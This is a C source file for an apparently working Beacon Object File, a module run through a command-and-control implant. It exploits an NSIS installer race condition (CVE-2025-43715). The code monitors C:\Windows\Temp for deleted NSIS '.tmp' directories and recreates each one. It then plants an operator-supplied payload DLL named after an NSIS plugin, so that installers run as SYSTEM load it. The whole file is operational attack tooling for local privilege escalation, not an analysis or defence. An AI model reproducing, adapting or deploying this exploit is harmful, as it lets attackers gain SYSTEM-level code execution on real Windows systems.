/*
 * NSIS race condition BOF (CVE-2025-43715)
 *
 * Watches C:\ (subtree) for NSIS temp directory deletions under
 * C:\Windows\Temp\*.tmp, matching the C# FileSystemWatcher approach. When
 * NSIS deletes a candidate directory, recreates it and writes the payload DLL
 * before NSIS reuses the path. NSIS installers run by IME as SYSTEM load the
 * planted DLL.
 *
 * Entry point: void go(char *args, int alen)
 *   arg0 (buffer) : payload DLL bytes (uploaded via C2 file selector)
 *   arg1 (string) : NSIS plugin name (default "nsExec.dll")
 *   arg2 (int)    : timeout in seconds (default 120)
 */

#include "beacon.h"
#include "bofdefs.h"

/* ----------------------------------------------------------------------------
 * DFR declarations missing from the shared bofdefs.h
 * -------------------------------------------------------------------------- */
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$ResetEvent(HANDLE);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleW(LPCWSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
#define bof_ResetEvent      KERNEL32$ResetEvent
#define bof_SetLastError    KERNEL32$SetLastError
#define bof_GetModuleHandleW KERNEL32$GetModuleHandleW
#define bof_GetProcAddress  KERNEL32$GetProcAddress

typedef HANDLE (WINAPI *PFN_CreateFileW)(
    LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);

/* ----------------------------------------------------------------------------
 * Local definitions
 * -------------------------------------------------------------------------- */
#ifndef FILE_LIST_DIRECTORY
#define FILE_LIST_DIRECTORY 0x0001
#endif

#define WATCH_ROOT    L"C:\\"
#define TARGET_DIR    L"C:\\Windows\\Temp"
#define TEMP_PREFIX   L"Windows\\Temp\\"
#define TEMP_PREFIX_LEN 13  /* wchar count of "Windows\Temp\" */
#define NOTIFY_BUFSZ  65536
#define NOTIFY_FILTER (FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_DIR_NAME)
#define POLL_MS       10

/*
 * FILE_NOTIFY_INFORMATION is defined in winnt.h, but declare a matching struct
 * name locally in case the toolchain headers omit it.
 */
typedef struct _NOTIFY_INFO {
    DWORD NextEntryOffset;
    DWORD Action;
    DWORD FileNameLength; /* bytes, not characters */
    WCHAR FileName[1];    /* NOT null-terminated */
} NOTIFY_INFO;

/* ----------------------------------------------------------------------------
 * Helpers
 * -------------------------------------------------------------------------- */

/* Match the reference NSIS plugin's deleted-directory filter. */
static BOOL is_tmp_dir(const wchar_t *name, int len)
{
    if (len < 4)
        return FALSE;
    const wchar_t *p = name + (len - 4);
    return (p[0] == L'.' &&
            (p[1] == L't' || p[1] == L'T') &&
            (p[2] == L'm' || p[2] == L'M') &&
            (p[3] == L'p' || p[3] == L'P'));
}

/*
 * Recreate a deleted NSIS temp directory and write the payload once, matching
 * IMEClient's Directory.CreateDirectory + File.WriteAllBytes behavior.
 */
static BOOL plant_payload(const wchar_t *dirname, int name_chars,
                          const wchar_t *plugin_w,
                          const unsigned char *payload, DWORD payload_len,
                          PFN_CreateFileW create_file_w)
{
    wchar_t fname[260];
    wchar_t dirpath[320];
    wchar_t dllpath[600];
    int i;

    if (name_chars <= 0 || name_chars >= 260)
        return FALSE;

    for (i = 0; i < name_chars; i++)
        fname[i] = dirname[i];
    fname[name_chars] = L'\0';

    if (!is_tmp_dir(fname, name_chars))
        return FALSE;

    bof_snwprintf(dirpath, 320, L"%s\\%s", TARGET_DIR, fname);
    dirpath[319] = L'\0';

    if (!bof_CreateDirectoryW(dirpath, NULL) &&
        bof_GetLastError() != ERROR_ALREADY_EXISTS)
        return FALSE;

    bof_snwprintf(dllpath, 600, L"%s\\%s", dirpath, plugin_w);
    dllpath[599] = L'\0';

    HANDLE hOut = create_file_w(dllpath, GENERIC_WRITE, FILE_SHARE_READ, NULL,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE)
        return FALSE;

    DWORD written = 0;
    DWORD total = 0;
    BOOL ok = TRUE;
    while (total < payload_len) {
        if (!bof_WriteFile(hOut, payload + total, payload_len - total,
                           &written, NULL) || written == 0) {
            ok = FALSE;
            break;
        }
        total += written;
    }

    bof_CloseHandle(hOut);
    return ok && total == payload_len;
}

/* ----------------------------------------------------------------------------
 * Entry point
 * -------------------------------------------------------------------------- */
void go(char *args, int alen)
{
    datap parser;
    BeaconDataParse(&parser, args, alen);
    int   payload_len = 0;
    char *payload_raw = BeaconDataExtract(&parser, &payload_len);
    char *plugin_name = BeaconDataExtract(&parser, NULL);
    int   timeout_sec = BeaconDataInt(&parser);

    if (payload_raw == NULL || payload_len <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No payload DLL provided\n");
        return;
    }
    if (plugin_name == NULL || bof_strlen(plugin_name) == 0)
        plugin_name = "nsExec.dll";
    if (timeout_sec <= 0)
        timeout_sec = 120;
    if (timeout_sec > 600) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Timeout must be 1-600 seconds\n");
        return;
    }

    /* Convert plugin name to wide. */
    wchar_t plugin_w[260];
    int pw = bof_MultiByteToWideChar(CP_UTF8, 0, plugin_name, -1, NULL, 0);
    if (pw <= 0 || pw > 260) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Bad plugin name\n");
        return;
    }
    bof_MultiByteToWideChar(CP_UTF8, 0, plugin_name, -1, plugin_w, pw);

    /* -----------------------------------------------------------------
     * Copy payload into a heap buffer so it outlives the arg parser.
     * ----------------------------------------------------------------- */
    DWORD fileSize = (DWORD)payload_len;
    unsigned char *payload = (unsigned char *)bof_malloc(fileSize);
    if (payload == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Out of memory (payload %lu bytes)\n", fileSize);
        return;
    }
    bof_memcpy(payload, payload_raw, fileSize);

    /* Resolve CreateFileW via GetProcAddress to bypass OC2 loader thunk
     * that corrupts the dwCreationDisposition argument. */
    PFN_CreateFileW create_file_w = NULL;
    HMODULE hK32 = bof_GetModuleHandleW(L"kernel32.dll");
    if (hK32)
        create_file_w = (PFN_CreateFileW)bof_GetProcAddress(hK32, "CreateFileW");
    if (!create_file_w)
        create_file_w = (PFN_CreateFileW)bof_CreateFileW;

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Payload loaded: %lu bytes. Plugin: %s. Timeout: %d s.\n",
        fileSize, plugin_name, timeout_sec);

    /* -----------------------------------------------------------------
     * Open C:\ for subtree monitoring, matching the C# FileSystemWatcher
     * setup (Path = "C:\", IncludeSubdirectories = true).
     * ----------------------------------------------------------------- */
    HANDLE hDir = create_file_w(
        WATCH_ROOT,
        FILE_LIST_DIRECTORY,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED,
        NULL);
    if (hDir == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Cannot open %S (err %lu)\n",
                     WATCH_ROOT, bof_GetLastError());
        bof_free(payload);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Opened %S for monitoring (subtree)\n",
                 WATCH_ROOT);

    HANDLE hEvent = bof_CreateEventW(NULL, TRUE, FALSE, NULL);
    if (hEvent == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateEventW failed (err %lu)\n",
                     bof_GetLastError());
        bof_CloseHandle(hDir);
        bof_free(payload);
        return;
    }

    OVERLAPPED ovl;
    bof_memset(&ovl, 0, sizeof(ovl));
    ovl.hEvent = hEvent;

    unsigned char *buf = (unsigned char *)bof_malloc(NOTIFY_BUFSZ);
    if (buf == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Out of memory (notify buf)\n");
        bof_CloseHandle(hEvent);
        bof_CloseHandle(hDir);
        bof_free(payload);
        return;
    }

    DWORD bytesReturned = 0;
    BOOL armed = bof_ReadDirectoryChangesW(
        hDir, buf, NOTIFY_BUFSZ, TRUE,
        NOTIFY_FILTER,
        &bytesReturned, &ovl, NULL);
    if (!armed) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ReadDirectoryChangesW failed (err %lu)\n",
                     bof_GetLastError());
        bof_free(buf);
        bof_CloseHandle(hEvent);
        bof_CloseHandle(hDir);
        bof_free(payload);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Watching %S for NSIS temp dirs (*.tmp)...\n",
                 TARGET_DIR);

    /* -----------------------------------------------------------------
     * Poll loop with timeout.
     * ----------------------------------------------------------------- */
    DWORD start = bof_GetTickCount();
    DWORD limit_ms = (DWORD)timeout_sec * 1000;
    int hits = 0;

    while (1) {
        DWORD elapsed = bof_GetTickCount() - start;
        if (elapsed >= limit_ms)
            break;

        DWORD wait = bof_WaitForSingleObject(hEvent, POLL_MS);
        if (wait == WAIT_TIMEOUT)
            continue;
        if (wait != WAIT_OBJECT_0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Directory wait failed (err %lu)\n",
                         bof_GetLastError());
            break;
        }

        DWORD transferred = 0;
        if (!bof_GetOverlappedResult(hDir, &ovl, &transferred, FALSE)) {
            /* Error pulling the result; re-arm and keep going. */
            bof_ResetEvent(hEvent);
            bof_memset(&ovl, 0, sizeof(ovl));
            ovl.hEvent = hEvent;
            if (!bof_ReadDirectoryChangesW(hDir, buf, NOTIFY_BUFSZ, TRUE,
                                           NOTIFY_FILTER,
                                           &bytesReturned, &ovl, NULL))
                break;
            continue;
        }

        if (transferred > 0) {
            unsigned char *cur = buf;
            while (1) {
                NOTIFY_INFO *ni = (NOTIFY_INFO *)cur;
                int name_chars = (int)(ni->FileNameLength / sizeof(WCHAR));
                BOOL try_plant = (ni->Action == FILE_ACTION_REMOVED);

                const wchar_t *fn = ni->FileName;
                int fn_chars = name_chars;
                /* Only act on paths under Windows\Temp\ */
                if (fn_chars > TEMP_PREFIX_LEN &&
                    bof_wcsnicmp(fn, TEMP_PREFIX, TEMP_PREFIX_LEN) == 0) {
                    fn += TEMP_PREFIX_LEN;
                    fn_chars -= TEMP_PREFIX_LEN;
                } else {
                    try_plant = FALSE;
                }

                if (try_plant) {
                    BOOL planted = plant_payload(fn, fn_chars, plugin_w,
                                                 payload, fileSize,
                                                 create_file_w);
                    if (planted) {
                        hits++;
                        char nbuf[300];
                        int nb = bof_WideCharToMultiByte(CP_UTF8, 0,
                                     fn, fn_chars,
                                     nbuf, sizeof(nbuf) - 1, NULL, NULL);
                        if (nb < 0) nb = 0;
                        nbuf[nb] = '\0';
                        BeaconPrintf(CALLBACK_OUTPUT,
                            "[+] Recreated C:\\Windows\\Temp\\%s and planted %s after deletion\n",
                            nbuf, plugin_name);
                    }
                }

                if (ni->NextEntryOffset == 0)
                    break;
                cur += ni->NextEntryOffset;
                if (cur >= buf + NOTIFY_BUFSZ)
                    break;
            }
        }

        /* Re-arm the watch. */
        bof_ResetEvent(hEvent);
        bof_memset(&ovl, 0, sizeof(ovl));
        ovl.hEvent = hEvent;
        bytesReturned = 0;
        if (!bof_ReadDirectoryChangesW(hDir, buf, NOTIFY_BUFSZ, TRUE,
                                       NOTIFY_FILTER,
                                       &bytesReturned, &ovl, NULL)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Re-arm failed (err %lu)\n",
                         bof_GetLastError());
            break;
        }
    }

    /* -----------------------------------------------------------------
     * Cleanup.
     * ----------------------------------------------------------------- */
    bof_CancelIo(hDir);
    bof_GetOverlappedResult(hDir, &ovl, &bytesReturned, TRUE);
    bof_CloseHandle(hDir);
    bof_CloseHandle(hEvent);
    bof_free(buf);
    bof_free(payload);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Done. Successful plants: %d\n", hits);
}
